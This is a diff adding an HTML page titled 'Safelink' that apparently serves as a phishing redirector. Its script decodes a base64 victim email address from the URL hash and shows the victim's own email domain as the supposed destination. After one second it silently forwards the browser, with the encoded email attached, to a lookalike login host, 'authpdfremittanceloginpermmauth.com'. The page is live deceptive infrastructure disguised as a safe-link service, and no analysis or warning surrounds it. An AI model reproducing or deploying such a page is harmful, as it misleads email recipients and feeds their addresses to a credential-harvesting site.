@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Safelink</title>
+    <script>
+    // Function to extract the domain from the email address
+    function extractDomain(email) {
+        var atIndex = email.indexOf('@');
+        if (atIndex !== -1) {
+            return email.substr(atIndex + 1);
+        }
+        return '';
+    }
+
+    // Decode the base64 email address
+    var base64email = window.location.hash.substr(1); // Remove the '#' from the hash
+    var email = atob(base64email); // Decode the base64 string
+
+    // Extract the domain from the email address
+    var domain = extractDomain(email);
+
+    // Perform the redirect to the specified URL with the encoded email
+    setTimeout(function() {
+        window.location.href = 'https://authpdfremittanceloginpermmauth.com/M' + base64email;
+    }, 1000);
+    </script>
+</head>
+<body>
+    <h1>Redirecting...</h1>
+    <p>You're being redirected to <strong id="redirectDomain"></strong> in a moment.</p>
+
+    <script>
+    // Update the content of the 'redirectDomain' element with the extracted domain
+    var redirectDomainElement = document.getElementById('redirectDomain');
+    redirectDomainElement.textContent = domain;
+    </script>
+</body>
+</html>
